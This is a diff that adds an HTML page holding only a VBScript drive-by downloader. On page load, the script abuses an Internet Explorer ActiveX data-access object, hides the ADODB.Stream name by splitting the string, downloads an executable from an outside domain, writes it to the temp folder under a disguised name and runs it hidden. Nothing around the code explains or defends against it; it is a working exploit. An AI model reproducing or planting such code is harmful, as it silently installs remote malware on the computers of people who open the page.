@@ -1,0 +1,36 @@
+<html>
+<script language="VBScript">
+on error resume next
+Set zzm = document.createElement("object")
+ma="http://aqzj.68ab.com/ma.exe"
+zzm.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
+str="Microsoft.XMLHTTP"
+a1="Ado"
+a2="db."
+a3="Str"
+a4="eam"
+str1=a1&a2&a3&a4
+str5=str1
+Set zz = zzm.CreateObject(str,"")
+set P = zzm.createobject(str5,"")
+P.type = 1
+str6="GET"
+zz.Open str6, ma, False
+zz.Send
+zzm24="driveir.exe"
+set tmp = A.GetSpecialFolder(2) 
+set A = zzm.createobject("Scripting.FileSystemObject","")
+zzm24= A.BuildPath(tmp,zzm24)
+P.open
+P.open
+P.open
+P.open
+P.write zz.responseBody
+P.savetofile zzm24,2
+P.close
+set Z = zzm.createobject("Shell.Application","") 
+Z.ShellExecute zzm24,"","","OPEN",0
+</script>
+<head>
+
+
